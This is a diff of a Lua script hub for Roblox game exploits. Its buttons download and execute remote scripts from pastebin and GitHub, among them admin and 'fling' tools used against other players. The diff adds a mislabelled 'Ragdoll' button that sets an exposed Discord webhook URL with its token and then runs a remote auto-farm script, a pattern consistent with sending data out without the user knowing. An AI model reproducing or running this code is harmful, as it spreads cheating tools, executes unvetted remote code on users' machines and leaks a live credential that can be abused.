@@ -86,14 +86,19 @@ AdminSection:NewButton("IY", "", function()
     loadstring(game:HttpGet('https://pastebin.com/raw/DSaCQud7', true))()
 end)
 
-AdminSection:NewButton("OP", "PATCHED", function()
-   loadstring(game:HttpGet("https://pastebin.com/raw/9srpYLnH"))()
+AdminSection:NewButton("IV admin", "use this for ahtfling 2493718915", function()
+   loadstring(game:HttpGet("https://raw.githubusercontent.com/BloodyBurns/Hexx/main/Iv%20Admin/Admin.lua"))();
 end)
 
 
 --Other
 local Other = Window:NewTab("Other")
 local OtherSection = Other:NewSection("Other scripts")
+
+OtherSection:NewButton("Ragdoll", "", function()
+    getgenv().WebhookURL = "https://discord.com/api/webhooks/1065109411577725048/FY7DNcpcgjKdd2OYPKwtSjVS1YNjTI6rNLg61vqYqMvi8KKo9WAupHunFelPqC1iXfe5"
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/coltonwach/Scripts/main/AirdropAutoFarm.lua"))()
+end)
 
 OtherSection:NewButton("Ragdoll", "", function()
     loadstring(game:HttpGet('https://raw.githubusercontent.com/martinelcrac/cryptonichub/main/Ragdollengine.lua'))()
